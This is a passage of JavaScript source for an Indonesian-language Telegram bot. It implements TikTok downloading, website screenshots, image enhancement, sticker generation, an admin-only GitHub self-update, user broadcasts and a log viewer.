caption: `<blockquote>🙈 Wajah sudah diblur otomatis!</blockquote>\n` +
`<i>Foto berhasil diproses dengan AI blur wajah.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (jsonError) {
console.error('JSON parse error:', jsonError);
await bot.editMessageText(
`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
`<code>${escapeHTML(jsonError.message)}</code>`,
{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
);
}
}
} catch (error) {
console.error('Toblur caption error:', error);
let errorMessage = '';
if (error.response?.status === 500) {
errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
} else if (error.message?.includes('timeout')) {
errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
} else {
errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
}
await bot.sendMessage(chatId, errorMessage, {
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
}
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 📱 TIKTOK DOWNLOAD COMMAND
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/tt(?:\s+(.+))?$/, async (msg, match) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const input = match[1];
const messageText = `/tt ${input || ''}`.trim();
logUserInteraction(userId, username, chatType, messageText, groupName);
if (!input) {
return bot.sendMessage(chatId,
"<blockquote>❌ Masukkan URL TikTok!</blockquote>\n\nContoh:\n<code>/tt https://vt.tiktok.com/ZSU7xy99R/</code>",
{ parse_mode: "HTML" }
);
}
const tiktokPatterns = [
/tiktok\.com\/.*\/video\/\d+/,
/vt\.tiktok\.com\/.+/,
/vm\.tiktok\.com\/.+/
];
const isValidUrl = tiktokPatterns.some(pattern => pattern.test(input));
if (!isValidUrl) {
return bot.sendMessage(chatId,
"<blockquote>❌ URL TikTok tidak valid!</blockquote>\n\nFormat yang didukung:\n• https://tiktok.com/@user/video/123\n• https://vt.tiktok.com/xxx\n• https://vm.tiktok.com/xxx",
{ parse_mode: "HTML" }
);
}
try {
const processingMsg = await bot.sendMessage(chatId,
"<blockquote>⏳ Mengambil data TikTok...</blockquote>",
{ parse_mode: "HTML", reply_to_message_id: msg.message_id }
);
const encodedUrl = encodeURIComponent(input);
// Ambil data dari kedua API secara bersamaan
const [responseInfo, responseDownload] = await Promise.all([
axios.get(`https://tikwm.com/api/?url=${encodedUrl}`, { timeout: 30000 }),
axios.get(`https://api.nvidiabotz.xyz/download/tiktok?url=${encodedUrl}`, { timeout: 30000 })
]);
const infoData = responseInfo.data;
const downloadData = responseDownload.data;
if (infoData.code !== 0 || !infoData.data || !downloadData.status) {
await bot.editMessageText(
"<blockquote>❌ Gagal mengambil data TikTok!</blockquote>",
{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: "HTML" }
);
return;
}
const videoInfo = infoData.data;
const downloadResult = downloadData.result;
const authorUniqueId = videoInfo.author?.unique_id || "";
const videoUrl = downloadResult?.video_hd || videoInfo.play;
if (!videoUrl) {
await bot.editMessageText(
"<blockquote>❌ Video tidak ditemukan!</blockquote>",
{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: "HTML" }
);
return;
}
const cacheKey = `tt_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
global.tiktokCache = global.tiktokCache || {};
global.tiktokCache[cacheKey] = { 
infoData, 
downloadData,
videoInfo, 
downloadResult,
authorUniqueId,
chatId: chatId,
messageId: processingMsg.message_id,
currentQuality: 'hd',
currentMedia: 'video'
};
const formatNumber = (num) => {
if (!num) return "0";
if (num >= 1000000) return (num / 1000000).toFixed(1) + "M";
if (num >= 1000) return (num / 1000).toFixed(1) + "K";
return num.toString();
};
const caption = `<blockquote>📱 TIKTOK DOWNLOADER</blockquote>\n
<b>🎬 Judul:</b> ${escapeHTML(videoInfo.title || 'Tidak ada judul')}\n
<b>👤 Creator:</b> ${authorUniqueId ? `@${escapeHTML(authorUniqueId)}` : 'Tidak diketahui'}\n
<b>📊 Statistik:</b>\n👁️ ${formatNumber(videoInfo.play_count || 0)} views\n❤️ ${formatNumber(videoInfo.digg_count || 0)} likes\n💬 ${formatNumber(videoInfo.comment_count || 0)} comments\n🔁 ${formatNumber(videoInfo.share_count || 0)} shares\n
<b>⏱️ Durasi:</b> ${videoInfo.duration || 0} detik\n
<i>Pilih opsi di bawah:</i>`;
const inlineKeyboard = {
inline_keyboard: [
[
{ text: "👤 LIHAT PROFIL", callback_data: `tt_profile_${cacheKey}` },
{ text: "🎵 DOWNLOAD AUDIO", callback_data: `tt_audio_${cacheKey}` },
{ text: "📹 DOWNLOAD SD", callback_data: `tt_sd_${cacheKey}` }
],
[
{ text: "❌ BATAL", callback_data: `tt_cancel_${cacheKey}` }
]
]
};
await bot.sendVideo(chatId, videoUrl, { caption: caption, parse_mode: "HTML", reply_markup: inlineKeyboard, reply_to_message_id: msg.message_id });
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (error) {
console.error("TikTok error:", error.message);
logError('TIKTOK_ERROR', `URL: ${input}, Error: ${error.message}`, userId, username);
bot.sendMessage(chatId, "<blockquote>❌ Error sistem!</blockquote>\n\nSilakan coba lagi atau gunakan URL yang berbeda.", { parse_mode: "HTML" });
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🌐 WEBSITE SCREENSHOT COMMAND
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/ssweb(?:\s+(.+))?$/, async (msg, match) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const messageText = `/ssweb ${match[1] || ''}`.trim();
logUserInteraction(userId, username, chatType, messageText, groupName);
const url = match[1];
if (!url) {
return bot.sendMessage(chatId,
"<blockquote>❌ Masukkan URL website!</blockquote>\nContoh: <code>/ssweb https://google.com</code>",
{ parse_mode: "HTML" }
);
}
if (!url.startsWith('http://') && !url.startsWith('https://')) {
return bot.sendMessage(chatId,
"<blockquote>❌ URL harus dimulai dengan http:// atau https://</blockquote>",
{ parse_mode: "HTML" }
);
}
try {
const processingMsg = await bot.sendMessage(chatId,
"<blockquote>🌐 Mengambil screenshot...</blockquote>",
{ parse_mode: "HTML", reply_to_message_id: msg.message_id }
);
const encodedUrl = encodeURIComponent(url);
const apiUrl = `https://api.jarroffc.my.id/tools/ssweb?apikey=jarroffc&url=${encodedUrl}`;
const response = await axios.get(apiUrl);
const data = response.data;
if (!data.status || !data.result) {
throw new Error('Gagal mengambil screenshot');
}
const screenshotUrl = data.result;
const screenshotResponse = await axios.get(screenshotUrl, { responseType: 'arraybuffer' });
const buffer = Buffer.from(screenshotResponse.data);
await bot.sendPhoto(chatId, buffer, {
caption: `<blockquote>✅ Screenshot berhasil!</blockquote>
<b>URL:</b> <code>${escapeHTML(url)}</code>
<b>Sumber:</b> ${data.creator || 'Jarr Officiall'}`,
parse_mode: "HTML",
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (error) {
console.error('SSWeb error:', error.message);
logError('SSWEB_ERROR', `URL: ${url}, Error: ${error.message}`, userId, username);
if (error.response?.status === 404) {
bot.sendMessage(chatId,
"<blockquote>❌ Website tidak ditemukan</blockquote>",
{ parse_mode: "HTML" }
);
} else if (error.message.includes('Gagal mengambil screenshot')) {
bot.sendMessage(chatId,
"<blockquote>❌ Gagal mengambil screenshot</blockquote>",
{ parse_mode: "HTML" }
);
} else if (error.message.includes('timeout')) {
bot.sendMessage(chatId,
"<blockquote>❌ Timeout, coba lagi</blockquote>",
{ parse_mode: "HTML" }
);
} else {
bot.sendMessage(chatId,
"<blockquote>❌ Error sistem</blockquote>",
{ parse_mode: "HTML" }
);
}
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🖼️ HD IMAGE ENHANCER COMMAND
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/hd$/, async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const messageText = '/hd';
logUserInteraction(userId, username, chatType, messageText, groupName);
let fileId = null;
if (msg.reply_to_message && msg.reply_to_message.photo) {
fileId = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1].file_id;
}
if (!fileId) {
return bot.sendMessage(chatId, 
"<blockquote>❌ Reply foto dengan /hd</blockquote>",
{ parse_mode: "HTML" }
);
}
try {
const processingMsg = await bot.sendMessage(chatId, 
"<blockquote>⚡ Memproses...</blockquote>",
{ parse_mode: "HTML" }
);
const fileLink = await bot.getFileLink(fileId);
const response = await axios.get(fileLink, { responseType: 'arraybuffer' });
const imageBuffer = Buffer.from(response.data);
const enhancedBuffer = await enhanceImage(imageBuffer);
await bot.sendPhoto(chatId, enhancedBuffer, {
caption: "<blockquote>✅ HD Enhance selesai</blockquote>",
parse_mode: "HTML"
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (error) {
bot.sendMessage(chatId, 
"<blockquote>❌ Gagal memproses</blockquote>",
{ parse_mode: "HTML" }
);
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 📸 PHOTO WITH /HD CAPTION HANDLER
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.on('photo', async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
if (msg.caption && msg.caption.trim() === '/hd') {
const messageText = 'PHOTO_CAPTION: /hd';
logUserInteraction(userId, username, chatType, messageText, groupName);
const fileId = msg.photo[msg.photo.length - 1].file_id;
try {
const processingMsg = await bot.sendMessage(chatId, 
"<blockquote>⚡ Memproses...</blockquote>",
{ parse_mode: "HTML" }
);
const fileLink = await bot.getFileLink(fileId);
const response = await axios.get(fileLink, { responseType: 'arraybuffer' });
const imageBuffer = Buffer.from(response.data);
const enhancedBuffer = await enhanceImage(imageBuffer);
await bot.sendPhoto(chatId, enhancedBuffer, {
caption: "<blockquote>✅ HD Enhance selesai</blockquote>",
parse_mode: "HTML"
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (error) {
bot.sendMessage(chatId, 
"<blockquote>❌ Gagal memproses</blockquote>",
{ parse_mode: "HTML" }
);
}
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🎨 IMAGE/STICKER GENERATOR COMMANDS
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/iqc(?:\s+(.+))?/, async (msg, match) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const messageText = `/iqc ${match[1] || ''}`.trim();
logUserInteraction(userId, username, chatType, messageText, groupName);
const input = match[1];
if (!input) {
return bot.sendMessage(chatId,
"<blockquote>❌ Format salah.</blockquote>\n\nContoh penggunaan:\n<code>/iqc Woik| 00:55 | 55 | INDOSAT</code>",
{ parse_mode: "HTML" }
);
}
const parts = input.split("|").map(p => p.trim());
const text = parts[0];
const time = parts[1] || "12:12";
const battery = parts[2] || "17";
const carrier = parts[3] || "INDOSAT OREDOO";
const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(text)}&carrierName=${encodeURIComponent(carrier)}&batteryPercentage=${encodeURIComponent(battery)}&signalStrength=4&emojiStyle=apple`;
try {
await bot.sendChatAction(chatId, "upload_photo");
const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
const buffer = Buffer.from(response.data, "binary");
await bot.sendPhoto(chatId, buffer, {
caption: `<blockquote>🪄 iPhone Quoted Generator ?</blockquote>
      
💬 <code>${escapeHTML(text)}</code>
🕒 ${time} | 🔋 ${battery}% | 📡 ${carrier}`,
parse_mode: "HTML",
reply_markup: {
inline_keyboard: [
[{ text: "⌈ DEVELϴPER ⌋", url: config.URLADMIN }]
]
}
});
} catch (err) {
console.error(err.message);
logError('IQC_COMMAND_ERROR', `Error: ${err.message}`, userId, username);
bot.sendMessage(chatId, "<blockquote>❌ Error membuat gambar.</blockquote>", { parse_mode: "HTML" });
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 📢 fitur brat
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/brat(?:\s+(.+))?/, async (msg, match) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const messageText = `/brat ${match[1] || ''}`.trim();
logUserInteraction(userId, username, chatType, messageText, groupName);
const argsRaw = match[1];
if (!argsRaw) {
return bot.sendMessage(chatId,
"<blockquote>❌ Format salah.</blockquote>\n\nContoh:\n<code>/brat Hello World</code>",
{ parse_mode: "HTML" }
);
}
try {
const text = argsRaw.trim();
if (!text) {
return bot.sendMessage(chatId, '<blockquote>❌ Teks kosong!</blockquote>', { parse_mode: "HTML" });
}
await bot.sendChatAction(chatId, "upload_photo");
const delay = 500;
const isAnimated = false;
const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
const buffer = Buffer.from(response.data);
await bot.sendSticker(chatId, buffer);
} catch (error) {
console.error('❌ Error brat:', error.message);
logError('BRAT_COMMAND_ERROR', `Error: ${error.message}`, userId, username);
bot.sendMessage(chatId, '<blockquote>❌ Gagal membuat stiker.</blockquote>', { parse_mode: "HTML" });
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 📢 fitur update
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/update$/, async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const messageText = '/update';    
logUserInteraction(userId, username, chatType, messageText, groupName);
if (!isAdmin(userId)) {
return bot.sendMessage(chatId, '<blockquote>❌ Hanya admin yang bisa!</blockquote>', { parse_mode: 'HTML' });
}
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 UPDATE SYSTEM</blockquote>\n\n` +
`🔍 Mencari versi terbaru di GitHub...\n` +
`⏳ Mohon tunggu...`,
{ parse_mode: 'HTML' }
);
try {
const currentVersion = getCurrentVersion();
const latestVersion = await checkLatestVersion();
if (!latestVersion) {
await bot.editMessageText(
`<blockquote>❌ UPDATE GAGAL</blockquote>\n\n` +
`Tidak dapat terhubung ke GitHub.\n` +
`URL: ${GITHUB_URL}\n\n` +
`<i>Pastikan koneksi internet stabil.</i>`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
return;
}
if (latestVersion === currentVersion) {
await bot.editMessageText(
`<blockquote>✅ SUDAH UPDATE</blockquote>\n\n` +
`Bot sudah menggunakan versi terbaru.\n` +
`Versi: <code>${currentVersion}</code>\n\n` +
`<i>Tidak ada update yang diperlukan.</i>`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
return;
}
await bot.editMessageText(
`<blockquote>🔄 UPDATE SYSTEM</blockquote>\n\n` +
`✅ Versi terbaru ditemukan!\n\n` +
`<b>📊 Perbandingan Versi:</b>\n` +
`• Versi lokal: <code>${currentVersion}</code>\n` +
`• Versi GitHub: <code>${latestVersion}</code>\n\n` +
`<b>⚙️ Mode Setting:</b>\n` +
`• setting.js: HANYA update versi\n` +
`• Token & setting lain: TETAP\n` +
`• File lain: Update penuh\n\n` +
`<b>🔗 Sumber:</b>\n` +
`${GITHUB_URL}\n\n` +
`<i>Memulai proses download...</i>`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
const timestamp = new Date().toISOString().replace(/[:.]/g, '-').split('T')[0];
const backupDir = path.join(__dirname, 'backup', `${timestamp}_v${currentVersion}`);
fs.mkdirSync(backupDir, { recursive: true });
let updatedFiles = [];
let failedFiles = [];
let step = 1;
const totalFiles = UPDATE_FILES.length;
for (const file of UPDATE_FILES) {
try {
await bot.editMessageText(
`<blockquote>🔄 UPDATE SYSTEM</blockquote>\n\n` +
`📥 Downloading file...\n\n` +
`Progress: ${step}/${totalFiles}\n` +
`File: <code>${file}</code>\n` +
`Status: Downloading...`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
const filePath = path.join(__dirname, file);
if (fs.existsSync(filePath)) {
const backupPath = path.join(backupDir, file);
fs.copyFileSync(filePath, backupPath);
}
if (file === 'setting.js') {
const currentSettings = readCurrentSettings();
const updatedSettings = updateVersionInSetting(currentSettings, latestVersion);
const finalContent = writeSettingFile(updatedSettings);
fs.writeFileSync(filePath, finalContent, 'utf8');
updatedFiles.push(`${file} (versi updated to ${latestVersion})`);
} else {
const fileContent = await downloadFileFromGithub(file);
fs.writeFileSync(filePath, fileContent, 'utf8');
updatedFiles.push(file);
}                
step++;
await new Promise(resolve => setTimeout(resolve, 500));
} catch (error) {
failedFiles.push(`${file} (${error.message})`);
}
}
if (updatedFiles.some(f => f.includes('package.json'))) {
await bot.editMessageText(
`<blockquote>🔄 UPDATE SYSTEM</blockquote>\n\n` +
`✅ File berhasil didownload\n` +
`📦 Menginstall dependencies baru...\n` +
`⏳ Mohon tunggu...`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
try {
const { execSync } = require('child_process');
execSync('npm install', { cwd: __dirname, stdio: 'inherit' });
} catch (npmError) {
console.log('NPM install error:', npmError);
}
}        
const successCount = updatedFiles.length;
const failCount = failedFiles.length;
let reportMessage = `<blockquote>✅ UPDATE SELESAI</blockquote>\n\n`;
reportMessage += `<b>📊 Hasil Update:</b>\n`;
reportMessage += `• Versi lama: <code>${currentVersion}</code>\n`;
reportMessage += `• Versi baru: <code>${latestVersion}</code>\n`;
reportMessage += `• File berhasil: ${successCount}\n`;
reportMessage += `• File gagal: ${failCount}\n\n`;
if (updatedFiles.length > 0) {
reportMessage += `<b>✅ File yang berhasil diupdate:</b>\n`;
updatedFiles.forEach(file => {
reportMessage += `• ${file}\n`;
});
reportMessage += `\n`;
}
if (failedFiles.length > 0) {
reportMessage += `<b>❌ File yang gagal diupdate:</b>\n`;
failedFiles.forEach(file => {
reportMessage += `• ${file}\n`;
});
reportMessage += `\n`;
}
const currentSettings = readCurrentSettings();
reportMessage += `<b>⚙️ Konfigurasi yang TETAP SAMA:</b>\n`;
reportMessage += `• Token: <code>${currentSettings.TELEGRAM_TOKEN ? '✓ Terjaga' : '✗ Tidak ada'}</code>\n`;
reportMessage += `• Owner ID: <code>${currentSettings.OWNER_ID || 'Tidak ada'}</code>\n`;
reportMessage += `• API Keys: <code>✓ Semua terjaga</code>\n`;
reportMessage += `\n`;
reportMessage += `<b>🚀 Langkah selanjutnya:</b>\n`;
reportMessage += `1. Ketik <code>/restart</code> untuk menerapkan perubahan\n`;
reportMessage += `2. Bot akan restart dengan versi baru\n`;
reportMessage += `3. Backup disimpan di: <code>${backupDir}</code>\n\n`;
reportMessage += `<i>Update selesai pada: ${new Date().toLocaleString('id-ID')}</i>`;
await bot.editMessageText(reportMessage, {
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
});
const ownerNotification = `<blockquote>📢 UPDATE BERHASIL</blockquote>\n\n` +
`<b>👤 Admin:</b> ${username}\n` +
`<b>🆔 ID:</b> <code>${userId}</code>\n` +
`<b>📅 Waktu:</b> ${new Date().toLocaleString('id-ID')}\n` +
`<b>🔄 Versi:</b> ${currentVersion} → ${latestVersion}\n` +
`<b>✅ Status:</b> Update selesai\n\n` +
`<b>🔧 Mode Update:</b>\n` +
`• Hanya versi yang diupdate\n` +
`• Token & konfigurasi TETAP\n` +
`• Setting lama: 100% terjaga\n\n` +
`<b>🚀 Silakan ketik:</b>\n<code>/restart</code>\n\n` +
`<i>Untuk menerapkan perubahan</i>`;
try {
await bot.sendMessage(config.OWNER_ID, ownerNotification, { parse_mode: 'HTML' });
} catch (error) {}
} catch (error) {
await bot.editMessageText(
`<blockquote>❌ UPDATE GAGAL</blockquote>\n\n` +
`Terjadi kesalahan saat proses update:\n\n` +
`<code>${error.message}</code>\n\n` +
`<b>🔗 GitHub URL:</b>\n` +
`${GITHUB_URL}\n\n` +
`<b>🔧 Solusi:</b>\n` +
`1. Cek koneksi internet\n` +
`2. Pastikan file ada di GitHub\n` +
`3. Coba lagi nanti\n` +
`4. Hubungi developer`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 📢 BROADCAST COMMAND (ADMIN ONLY) - DIPERBAIKI
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/broadcast(?:\s+)?/, async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const messageText = msg.text || '';
logUserInteraction(userId, username, chatType, messageText, groupName);
if (!isAdmin(userId)) {
return bot.sendMessage(chatId, '<b>❌ Hanya admin yang bisa!</b>', { parse_mode: 'HTML' });
}
let broadcastText = '';
if (msg.text) {
const match = msg.text.match(/^\/broadcast(?:\s+)?/);
if (match) {
broadcastText = msg.text.substring(match[0].length).trim();
}
}
if (!broadcastText && !msg.reply_to_message) {
return bot.sendMessage(chatId,
`<blockquote>📢 <b>BROADCAST COMMAND</b></blockquote>\n\n` +
`<b>Format penggunaan:</b>\n\n` +
`<code>/broadcast [pesan]</code>\n` +
`Contoh: <code>/broadcast 𝘾𝙀𝙋𝘼𝙉𝙀𝙇 𝙑𝟭.𝟬 🤖\\n📦 DAFTAR HARGA</code>\n\n` +
`Atau reply foto/video/audio/dokumen dengan:\n` +
`<code>/broadcast [caption]</code>\n\n` +
`<b>Note:</b> Teks akan dikirim dengan format HTML.`,
{ parse_mode: 'HTML' }
);
}
const users = loadUsers();
const userIds = Object.keys(users);
if (userIds.length === 0) {
return bot.sendMessage(chatId,
`<blockquote>❌ Tidak Ada User</blockquote>\n\n` +
`Belum ada user yang terdaftar dalam database.`,
{ parse_mode: 'HTML' }
);
}
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>📢 MEMULAI BROADCAST</blockquote>\n\n` +
`<b>Status:</b> Memulai proses broadcast...\n` +
`<b>Total User:</b> ${userIds.length} user\n` +
`<b>Waktu:</b> ${new Date().toLocaleTimeString('id-ID', {hour12: false})}\n\n` +
`<i>Mohon tunggu, proses mungkin memakan waktu...</i>`,
{ parse_mode: 'HTML' }
);
try {
let successCount = 0;
let failedCount = 0;
const startTime = Date.now();
let broadcastMessage = '';
if (broadcastText) {
const formattedText = broadcastText
.replace(/\n\s*\n/g, '<br><br>')
.replace(/\n/g, '<br>');
broadcastMessage = `<blockquote>${formattedText}</blockquote>`;
}
const sendToUser = async (targetUserId, index) => {
try {
await new Promise(resolve => setTimeout(resolve, index * 100));
if (msg.reply_to_message) {
const repliedMsg = msg.reply_to_message;
let captionText = '';
if (broadcastText) {
captionText = broadcastText
.replace(/\n\s*\n/g, '\n\n')
.replace(/<br\s*\/?>/g, '\n');
}
if (repliedMsg.photo) {
const photo = repliedMsg.photo[repliedMsg.photo.length - 1];
await bot.sendPhoto(targetUserId, photo.file_id, {
caption: broadcastText ? `<blockquote>${captionText}</blockquote>` : '',
parse_mode: 'HTML'
});
} else if (repliedMsg.video) {
const video = repliedMsg.video;
const originalCaption = repliedMsg.caption || '';
await bot.sendVideo(targetUserId, video.file_id, {
caption: broadcastText ? `<blockquote>${captionText}</blockquote>` : 
(originalCaption ? `<blockquote>${originalCaption}</blockquote>` : ''),
parse_mode: 'HTML'
});
} else if (repliedMsg.audio) {
const audio = repliedMsg.audio;
const originalCaption = repliedMsg.caption || '';
await bot.sendAudio(targetUserId, audio.file_id, {
caption: broadcastText ? `<blockquote>${captionText}</blockquote>` : 
(originalCaption ? `<blockquote>${originalCaption}</blockquote>` : ''),
parse_mode: 'HTML'
});
} else if (repliedMsg.document) {
const document = repliedMsg.document;
const originalCaption = repliedMsg.caption || '';
await bot.sendDocument(targetUserId, document.file_id, {
caption: broadcastText ? `<blockquote>${captionText}</blockquote>` : 
(originalCaption ? `<blockquote>${originalCaption}</blockquote>` : ''),
parse_mode: 'HTML'
});
} else {
if (broadcastMessage) {
await bot.sendMessage(targetUserId, broadcastMessage, { parse_mode: 'HTML' });
}
}
} else {
if (broadcastMessage) {
await bot.sendMessage(targetUserId, broadcastMessage, { parse_mode: 'HTML' });
}
}
successCount++;
if (successCount % 10 === 0 || successCount + failedCount === userIds.length) {
const elapsedTime = Math.floor((Date.now() - startTime) / 1000);
const processed = successCount + failedCount;
const percentage = Math.floor((processed / userIds.length) * 100);
await bot.editMessageText(
`<blockquote>📢 BROADCAST BERJALAN</blockquote>\n\n` +
`<b>Status:</b> Sedang mengirim...\n` +
`<b>Progress:</b> ${processed}/${userIds.length}\n` +
`<b>Berhasil:</b> ${successCount} user\n` +
`<b>Gagal:</b> ${failedCount} user\n` +
`<b>Waktu:</b> ${elapsedTime} detik\n\n` +
`<i>${percentage}% selesai...</i>`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
}
} catch (error) {
failedCount++;
console.error(`Gagal mengirim ke ${targetUserId}:`, error.message);
}
};
for (let i = 0; i < userIds.length; i++) {
await sendToUser(userIds[i], i);
}
const totalTime = Math.floor((Date.now() - startTime) / 1000);
const successRate = ((successCount / userIds.length) * 100).toFixed(2);
const resultMessage = `<blockquote>✅ BROADCAST SELESAI</blockquote>\n\n` +
`<b>📊 Hasil Broadcast:</b>\n` +
`<b>Total User:</b> ${userIds.length}\n` +
`<b>Berhasil dikirim:</b> ${successCount} user\n` +
`<b>Gagal dikirim:</b> ${failedCount} user\n` +
`<b>Persentase sukses:</b> ${successRate}%\n` +
`<b>Waktu total:</b> ${totalTime} detik\n\n`;
const statsMessage = `<blockquote>📈 STATISTIK PENGIRIMAN</blockquote>\n\n` +
`<b>Mode:</b> ${msg.reply_to_message ? 'Media + Caption' : 'Teks Saja'}\n` +
`<b>Panjang teks:</b> ${broadcastText ? broadcastText.length : 0} karakter\n` +
`<b>Waktu mulai:</b> ${new Date(startTime).toLocaleTimeString('id-ID')}\n` +
`<b>Waktu selesai:</b> ${new Date().toLocaleTimeString('id-ID')}\n` +
`<b>Durasi:</b> ${totalTime} detik\n\n` +
`<blockquote><i>Broadcast selesai pada: ${new Date().toLocaleString('id-ID')}</i></blockquote>`;
await bot.editMessageText(resultMessage + statsMessage, {
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
});
setTimeout(async () => {
try {
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (error) {
console.log('Tidak bisa menghapus pesan status:', error.message);
}
}, 10000);
} catch (error) {
console.error('Broadcast error:', error);
logError('BROADCAST_ERROR', `Error: ${error.message}`, userId);
await bot.editMessageText(
`<blockquote>❌ BROADCAST GAGAL</blockquote>\n\n` +
`Error: ${error.message}\n\n` +
`Silakan coba lagi nanti.`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 📜 LOG VIEWER COMMAND (ADMIN ONLY) - SIMPLE
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/logs$/, async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const messageText = '/logs';
logUserInteraction(userId, username, chatType, messageText, groupName);
if (!isAdmin(userId)) {
return bot.sendMessage(chatId, '<b>❌ Hanya admin yang bisa!</b>', { parse_mode: 'HTML' });
}
try {
if (!fs.existsSync(LOG_FILE)) {
return bot.sendMessage(chatId,
`<blockquote>📁 File Log Tidak Ditemukan</blockquote>\n\n` +
`File <code>log.txt</code> tidak ditemukan di folder <code>lib/</code>.\n\n` +
`<b>Kemungkinan:</b>\n` +
